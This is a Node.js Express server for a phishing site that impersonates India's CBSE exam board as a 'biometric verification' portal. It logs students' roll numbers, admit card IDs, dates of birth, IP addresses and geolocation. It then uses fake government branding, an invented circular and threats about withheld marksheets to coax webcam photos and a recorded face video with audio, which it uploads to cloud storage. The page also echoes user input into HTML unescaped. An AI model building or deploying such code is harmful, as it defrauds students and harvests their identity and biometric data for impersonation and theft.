const express = require("express");
const path = require("path");
const multer = require("multer");
const mongoose = require("mongoose");
const cloudinary = require("cloudinary").v2;
const CloudinaryStorage =
  require("multer-storage-cloudinary").CloudinaryStorage;

// ── Cloudinary Config ──────────────────────────────────────────────────────────
cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET,
});

// ── Multer / CloudinaryStorage (resource_type: auto handles images + videos) ───
const cloudStorage = new CloudinaryStorage({
  cloudinary,
  params: {
    folder: "cbse_uploads",
    resource_type: "auto",
  },
});

const upload = multer({ storage: cloudStorage });

// ── Express Setup ──────────────────────────────────────────────────────────────
const app = express();
app.use(express.static(__dirname));
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: "10mb" }));

// ── MongoDB Connection ─────────────────────────────────────────────────────────
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

// ── Schema & Model ─────────────────────────────────────────────────────────────
const userSchema = new mongoose.Schema({
  RollNo: String,
  SchoolNo: String,
  admitCardId: String,
  dob: String,
  latitude: String,
  longitude: String,
  accuracy: String,
  ip: String,
  time: String,
  image: String,
  video: String,
});

const User = mongoose.model("User", userSchema);

// ── MAIN ROUTE ─────────────────────────────────────────────────────────────────
app.post("/api/result", async (req, res) => {
  const { RollNo, SchoolNo, admitCardId, dob, latitude, longitude, accuracy } =
    req.body;

  if (!RollNo || !SchoolNo || !admitCardId || !dob) {
    return res.send("Missing fields");
  }

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress ||
    req.ip;

  try {
    await User.create({
      RollNo,
      SchoolNo,
      admitCardId,
      dob,
      latitude,
      longitude,
      accuracy,
      ip,
      time: new Date().toISOString(),
    });
  } catch (err) {
    console.error("Failed to save user data:", err);
  }

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CBSE | Candidate Verification Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --teal: #00838f; --teal-dark: #006064; --teal-mid: #00acc1;
      --accent: #00bcd4; --text: #1a1a1a; --muted: #546e7a;
      --border: #b2dfdb; --red: #c00;
    }
    body { font-family: 'Noto Sans', Arial, sans-serif; background: #eef7f8; min-height: 100vh; color: var(--text); }
    .gov-ribbon { background: var(--teal-dark); color: #e0f7fa; font-size: 11.5px; text-align: center; padding: 4px 0; letter-spacing: 0.4px; }
    .site-header { background: #fff; border-bottom: 3px solid var(--teal-mid); padding: 12px 0; }
    .header-inner { max-width: 1100px; margin: 0 auto; padding: 0 24px; display: flex; align-items: center; }
    .cbse-logo-img { height: 72px; flex-shrink: 0; object-fit: contain; background: #fff; padding: 5px 10px; border-radius: 4px; }
    .header-sub { margin-left: 20px; border-left: 2px solid var(--border); padding-left: 18px; }
    .header-sub .portal-title { font-size: 14px; font-weight: 700; color: var(--teal-dark); }
    .header-sub .portal-sub { font-size: 12px; color: var(--muted); margin-top: 3px; }
    .header-sub .portal-sub span { color: var(--red); font-weight: 600; }
    .nav-bar { background: var(--teal-dark); padding: 0 24px; border-bottom: 2px solid var(--teal-mid); }
    .nav-bar ul { max-width: 1100px; margin: 0 auto; list-style: none; display: flex; }
    .nav-bar ul li a { display: block; color: #b2ebf2; font-size: 13px; font-weight: 500; padding: 10px 18px; text-decoration: none; border-right: 1px solid rgba(255,255,255,0.12); transition: background 0.18s, color 0.18s; }
    .nav-bar ul li a:hover { background: var(--teal); color: #fff; }
    .nav-bar ul li a.active { background: var(--accent); color: #fff; font-weight: 700; }
    .breadcrumb { max-width: 1100px; margin: 11px auto 0; padding: 0 24px; font-size: 12px; color: #78909c; }
    .breadcrumb a { color: var(--teal); text-decoration: none; }
    .main-wrap { max-width: 1100px; margin: 16px auto 40px; padding: 0 24px; display: grid; grid-template-columns: 1fr 300px; gap: 20px; }
    .card { background: #fff; border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
    .card-header { background: linear-gradient(90deg, var(--teal-dark), var(--teal)); color: #fff; padding: 10px 16px; font-size: 13.5px; font-weight: 700; display: flex; align-items: center; gap: 8px; }
    .card-header .dot { width: 8px; height: 8px; background: var(--accent); border-radius: 50%; flex-shrink: 0; }
    .card-body { padding: 18px 20px; }
    .info-table { width: 100%; border-collapse: collapse; font-size: 13.5px; margin-bottom: 18px; }
    .info-table tr { border-bottom: 1px solid #e0f2f1; }
    .info-table td:first-child { color: var(--muted); font-weight: 500; padding: 8px 12px 8px 0; width: 140px; }
    .info-table td:last-child { color: #111; font-weight: 600; padding: 8px 0; }
    .badge { background: #e0f7fa; color: var(--teal-dark); border: 1px solid var(--teal-mid); border-radius: 3px; padding: 2px 8px; font-size: 12px; font-weight: 700; }
    .camera-wrap { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 14px; }
    .video-box { flex: 1 1 260px; background: #000; border-radius: 4px; overflow: hidden; min-height: 200px; display: flex; align-items: center; justify-content: center; }
    video, #preview { width: 100%; height: auto; display: block; border-radius: 4px; }
    canvas { display: none; }
    #preview { display: none; }
    .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 10px; }
    .btn { display: inline-flex; align-items: center; gap: 6px; padding: 8px 16px; border: none; border-radius: 3px; font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit; transition: opacity 0.15s; }
    .btn:hover { opacity: 0.88; }
    .btn-primary   { background: var(--teal-dark); color: #fff; }
    .btn-success   { background: #2e7d32; color: #fff; }
    .btn-secondary { background: #546e7a; color: #fff; }
    .btn-warning   { background: #e65100; color: #fff; }
    #status { font-size: 13px; padding: 8px 12px; border-radius: 3px; display: none; margin-top: 8px; }
    #status.show { display: block; }
    #status.success   { background: #e8f5e9; color: #1b5e20; border: 1px solid #a5d6a7; }
    #status.recording { background: #fff3e0; color: #bf360c; border: 1px solid #ffcc80; }
    .sidebar { display: flex; flex-direction: column; gap: 16px; }
    .help-card ul { padding-left: 16px; }
    .help-card ul li { font-size: 13px; color: #444; margin-bottom: 7px; line-height: 1.5; }
    footer { background: var(--teal-dark); color: #b2ebf2; text-align: center; font-size: 11.5px; padding: 14px 24px; line-height: 1.8; }
    footer a { color: #80deea; text-decoration: none; }
    @media (max-width: 700px) { .main-wrap { grid-template-columns: 1fr; } }
  </style>
</head>
<body>

<div class="gov-ribbon">Government of India &nbsp;|&nbsp; Ministry of Education &nbsp;|&nbsp; Central Board of Secondary Education (CBSE)</div>

<header class="site-header">
  <div class="header-inner">
    <img src="/cbselogo.png" alt="CBSE Logo" class="cbse-logo-img" onerror="this.style.display='none'"/>
    <div class="header-sub">
      <div class="portal-title">CENTRAL BOARD OF SECONDARY EDUCATION</div>
      <div class="portal-sub">Candidate Verification Portal &nbsp;|&nbsp; <span>Session 2025–26</span></div>
    </div>
  </div>
</header>

<nav class="nav-bar">
  <ul>
    <li><a href="#">Home</a></li>
    <li><a href="#" class="active">Biometric Verification</a></li>
    <li><a href="#" onclick="showResultsBlocked(event)">Results</a></li>
    <li><a href="#">Admit Card</a></li>
    <li><a href="#">Help &amp; Support</a></li>
  </ul>
</nav>

<div class="breadcrumb"><a href="#">Home</a> &rsaquo; <a href="#">Candidate Portal</a> &rsaquo; Biometric Verification</div>

<div class="main-wrap">
  <div>
    <div class="card" style="margin-bottom:16px;">
      <div class="card-header"><span class="dot"></span> Candidate Details</div>
      <div class="card-body">
        <table class="info-table">
          <tr><td>Roll Number</td><td><span class="badge">${RollNo}</span></td></tr>
          <tr><td>School No.</td><td>${SchoolNo}</td></tr>
          <tr><td>Admit Card ID</td><td>${admitCardId}</td></tr>
          <tr><td>Date of Birth</td><td>${dob}</td></tr>
        </table>
      </div>
    </div>

    <div class="card">
      <div class="card-header"><span class="dot"></span> Live Biometric Capture</div>
      <div class="card-body">
        <div class="camera-wrap">
          <div class="video-box"><video id="video" autoplay playsinline></video></div>
          <div class="video-box" style="background:#f5f5f5;">
            <canvas id="canvas" width="320" height="240"></canvas>
            <img id="preview" alt="Captured photo"/>
          </div>
        </div>
        <div class="btn-row">
          <button class="btn btn-primary" onclick="startCamera()">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
            Start Camera
          </button>
          <button class="btn btn-success" id="captureBtn" onclick="capturePhoto()" style="display:none;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/></svg>
            Capture Photo
          </button>
          <button class="btn btn-success" id="submitPhotoBtn" onclick="submitPhoto()" style="display:none;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
            Submit Photo
          </button>
          <button class="btn btn-secondary" id="retakeBtn" onclick="retakePhoto()" style="display:none;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 102.13-9.36L1 10"/></svg>
            Retake
          </button>
          <button class="btn btn-warning" id="verifyBtn" onclick="start3DVerification()" style="display:none;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
            Start 3D Face Verification
          </button>
        </div>
        <p id="status"></p>
      </div>
    </div>
  </div>

  <div class="sidebar">
    <div class="card help-card">
      <div class="card-header"><span class="dot"></span> Verification Guidelines</div>
      <div class="card-body">
        <ul>
          <li>Sit in a <strong>well-lit</strong> area facing the camera.</li>
          <li>Remove <strong>spectacles, caps or masks</strong> before capture.</li>
          <li>Keep face <strong>centred</strong> in the live feed frame.</li>
          <li>Do not click Capture unless the image is clear.</li>
          <li>3D verification requires <strong>10 seconds</strong> of movement.</li>
          <li>Do not close this window during recording.</li>
        </ul>
      </div>
    </div>

    <div class="card contact-card">
      <div class="card-header" style="background:linear-gradient(90deg,#8b0000 0%,#c00 100%);">
        <span class="dot" style="background:#fff;"></span> ⚠ NOTICE
      </div>
      <div class="card-body" style="background:#fff8f8;border:1px solid #f5c6c6;border-top:none;">
        <p style="font-size:13px;color:#7a0000;font-weight:700;margin-bottom:8px;line-height:1.5;">MANDATORY BIOMETRIC AUTHENTICATION</p>
        <p style="font-size:12.5px;color:#333;line-height:1.7;">It is <strong style="color:#c00;">mandatory</strong> for all candidates to complete this biometric authentication process.</p>
        <p style="font-size:12.5px;color:#333;line-height:1.7;margin-top:8px;"><strong style="color:#c00;">Failure to do so may result in non-issuance of your Marksheet / Certificate</strong> by the Board.</p>
        <p style="font-size:11px;color:#888;margin-top:10px;border-top:1px solid #f5c6c6;padding-top:8px;">Ref: CBSE Circular No. Acad-XX/2026 &nbsp;|&nbsp; All Regions</p>
      </div>
    </div>

    <div class="card">
      <div class="card-header"><span class="dot"></span> Important Dates</div>
      <div class="card-body" style="font-size:12.5px;">
        <table style="width:100%;border-collapse:collapse;">
          <tr style="border-bottom:1px solid #e0f2f1;"><td style="padding:7px 0;color:#546e7a;">Biometric Authentication</td><td style="text-align:right;font-weight:700;color:#1a7a1a;">Ongoing 🟢</td></tr>
          <tr><td style="padding:7px 0;color:#546e7a;">Exam Commencement</td><td style="text-align:right;font-weight:700;">17 Feb 2026</td></tr>
        </table>
      </div>
    </div>
  </div>
</div>

<footer>
  &copy; 2026 Central Board of Secondary Education, New Delhi. All Rights Reserved. &nbsp;|&nbsp;
  <a href="#">Privacy Policy</a> &nbsp;|&nbsp; <a href="#">Terms of Use</a> &nbsp;|&nbsp;
  <a href="#">Screen Reader Access</a><br>
  This portal is best viewed in Google Chrome / Mozilla Firefox at 1024×768 resolution.
</footer>

<script>
  function showResultsBlocked(e) {
    e.preventDefault();
    document.getElementById("resultsOverlay").style.display = "flex";
  }
  function closeResultsOverlay() {
    document.getElementById("resultsOverlay").style.display = "none";
  }

  let stream;

  function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then(s => {
        stream = s;
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.muted = true;
        document.getElementById("captureBtn").style.display = "inline-flex";
      })
      .catch(() => alert("Camera access denied. Please allow camera permissions to proceed."));
  }

  function capturePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    const preview = document.getElementById("preview");
    preview.src = canvas.toDataURL("image/png");
    preview.style.display = "block";
    document.getElementById("submitPhotoBtn").style.display = "inline-flex";
    document.getElementById("retakeBtn").style.display = "inline-flex";
  }

  function submitPhoto() {
    const canvas = document.getElementById("canvas");
    canvas.toBlob(function(blob) {
      const formData = new FormData();
      formData.append("file", blob, "photo.png");
      fetch("/upload-image", { method: "POST", body: formData })
        .then(res => res.json())
        .then(() => {
          const s = document.getElementById("status");
          s.textContent = "✔ Photo submitted successfully. Please proceed to 3D Face Verification.";
          s.className = "show success";
          document.getElementById("verifyBtn").style.display = "inline-flex";
        })
        .catch(() => alert("Image upload failed. Please try again."));
    }, "image/png");
  }

  function retakePhoto() {
    document.getElementById("preview").src = "";
    document.getElementById("preview").style.display = "none";
    document.getElementById("submitPhotoBtn").style.display = "none";
    document.getElementById("retakeBtn").style.display = "none";
    document.getElementById("verifyBtn").style.display = "none";
    const s = document.getElementById("status");
    s.textContent = ""; s.className = "";
  }

  let mediaRecorder, recordedChunks = [];

  function start3DVerification() {
    if (!stream) { alert("Please start the camera first."); return; }
    const s = document.getElementById("status");
    s.textContent = "⏺ Recording in progress… Please move your face slowly left and right. Do not close this window.";
    s.className = "show recording";
    recordedChunks = [];
    mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = function(e) { if (e.data.size > 0) recordedChunks.push(e.data); };
    mediaRecorder.onstop = function() {
      const blob = new Blob(recordedChunks, { type: "video/webm" });
      const formData = new FormData();
      formData.append("file", blob, "verification.webm");
      fetch("/upload-video", { method: "POST", body: formData })
        .then(res => res.json())
        .then(() => {
          s.textContent = "✔ Verification Successful. Marksheet will be generated shortly when released.";
          s.className = "show success";
        })
        .catch(() => alert("Video upload failed. Please try again."));
    };
    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 10000);
  }
</script>

<div id="resultsOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:9999;align-items:center;justify-content:center;">
  <div style="background:#fff;border-radius:5px;max-width:520px;width:90%;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.35);">
    <div style="background:linear-gradient(90deg,#8b0000,#c00);color:#fff;padding:14px 20px;display:flex;align-items:center;gap:10px;font-size:15px;font-weight:700;">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
      Access Restricted — CBSE Examination Portal
    </div>
    <div style="padding:24px 24px 10px;text-align:center;">
      <div style="width:64px;height:64px;background:#e0f7fa;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#006064" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
      </div>
      <p style="font-size:17px;font-weight:700;color:#8b0000;margin-bottom:10px;">Result Access Not Permitted</p>
      <p style="font-size:13.5px;color:#444;line-height:1.75;margin-bottom:14px;">Your result is currently <strong>locked</strong>. To access your result, you must first complete the mandatory <strong>Biometric Authentication</strong> process on this page.</p>
      <div style="background:#fff8e1;border:1px solid #ffe082;border-left:4px solid #f9a825;border-radius:3px;padding:10px 14px;text-align:left;font-size:12.5px;color:#555;margin-bottom:18px;line-height:1.6;">
        <strong style="color:#c55000;">Note:</strong> Failure to complete biometric verification may result in <strong style="color:#c00;">non-issuance of your Marksheet</strong> as per CBSE Board directives.
      </div>
      <button onclick="closeResultsOverlay()" style="background:#006064;color:#fff;border:none;padding:10px 28px;border-radius:3px;font-size:13.5px;font-weight:600;cursor:pointer;font-family:inherit;">← Complete Verification First</button>
    </div>
    <div style="text-align:center;padding:10px;font-size:11px;color:#aaa;border-top:1px solid #eee;margin-top:10px;">CBSE Examination Portal &nbsp;|&nbsp; Ref: CBSE/Bio-Auth/2025</div>
  </div>
</div>

</body>
</html>`);
});

// ── IMAGE UPLOAD ROUTE ─────────────────────────────────────────────────────────
app.post("/upload-image", upload.single("file"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file uploaded" });

  const imageUrl = req.file.path;
  console.log("Image uploaded to Cloudinary:", imageUrl);

  try {
    await User.findOneAndUpdate({}, { image: imageUrl }, { sort: { _id: -1 } });
  } catch (err) {
    console.error("Failed to save image URL:", err);
  }

  res.json({ url: imageUrl });
});

// ── VIDEO UPLOAD ROUTE ─────────────────────────────────────────────────────────
app.post("/upload-video", upload.single("file"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file uploaded" });

  const videoUrl = req.file.path;
  console.log("Video uploaded to Cloudinary:", videoUrl);

  try {
    await User.findOneAndUpdate({}, { video: videoUrl }, { sort: { _id: -1 } });
  } catch (err) {
    console.error("Failed to save video URL:", err);
  }

  res.json({ url: videoUrl });
});

// ── START SERVER ───────────────────────────────────────────────────────────────
app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});
